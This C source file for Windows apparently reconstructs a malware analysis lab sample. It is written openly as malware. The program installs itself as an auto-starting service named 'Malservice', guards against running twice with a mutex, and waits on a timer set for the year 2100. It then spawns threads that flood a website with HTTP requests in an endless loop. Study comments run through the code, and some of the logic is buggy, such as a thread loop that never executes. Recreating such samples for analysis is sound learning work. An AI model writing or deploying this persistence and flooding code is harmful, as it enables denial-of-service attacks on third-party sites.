#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "Advapi32.lib")



void WINAPI MalserviceMain(DWORD a, LPTSTR *b);
DWORD WINAPI DDOS(LPVOID lpParam);

void (*fff)() = *InternetOpenURLA;

int main(){

	SERVICE_TABLE_ENTRYA Malservice;
	Malservice.lpServiceName = "Malservice";
	Malservice.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)MalserviceMain;

	StartServiceCtrlDispatcherA(&Malservice);
	//DWORD dw = GetLastError();
	MalserviceMain(0, NULL);

	return 0;
}

void WINAPI MalserviceMain(DWORD a, LPTSTR *b){
	//for debugging
	//DWORD error;

	char binaryPathName [1000];
	char Name [] = "HGL345";
	char DisplayName[] = "Malservice";

	SYSTEMTIME systemTime;
	systemTime.wYear = 2100;
	//ddosDate.wMonth = 1;
	//ddosDate.wDay = 1;
	//ddosDate.wHour = 0;
	//ddosDate.wMinute = 0;
	//ddosDate.wSecond = 0;

	FILETIME fileTime;

	//try to obtain mutex
	HANDLE mutexExists = OpenMutexA(0x1F0001, 0, Name);

	//if mutex already exists then terminate
	if (mutexExists){
		ExitProcess(0);
	}
	
	//do not check if mutex creation was successful
	CreateMutexA(0, 0, Name);

	HANDLE h = OpenSCManagerA(0, 0, 3);

	//why is this needed?
	GetCurrentProcess();

	//finds path to binary (self)
	GetModuleFileNameA(0, binaryPathName, 0x3E8);

	CreateServiceA(h, DisplayName, DisplayName, 2, 16, 2, 0, binaryPathName, 0, 0, 0, 0, 0);
	//error = GetLastError();

	//converts System Time to File Time
	SystemTimeToFileTime(&systemTime, &fileTime); //invalid parameters??
	//error = GetLastError(); //returns 0 but ^function^ returns a4 which means invalid parameters??

	HANDLE t = CreateWaitableTimerA(0, 0, 0);
	//error = GetLastError();

	//sets a waitable timer based on fileTime
	SetWaitableTimer(t, &fileTime, 0, 0, 0, 0);
	//error = GetLastError();
	DWORD d = WaitForSingleObject(t, INFINITE);

	
	if (!d){
		for (int i = 20; i == 0; i--){
		  { void (*f)() = &CreateThread;
		    (*f)(0, 0, DDOS, 0, 0, 0);
		  }
		}
	}

	Sleep(INFINITE);
	return;
}

DWORD WINAPI DDOS (LPVOID lpParam){
	char szAgent[] = "Internet Explorer 8.0";
	char szUrl[] = "http://www.malwareanalysisbook.com";

	HINTERNET i = InternetOpenA(szAgent, 1, 0, 0, 0);

	while (TRUE){
		//might need to use function pointer for createthread to mimic assembly
		//InternetOpenUrlA(i, szUrl, 0, 0, 0x80000000, 0);
	  (*fff)(i, szUrl, 0, 0, 0x80000000, 0);
	}
	return 0;
}
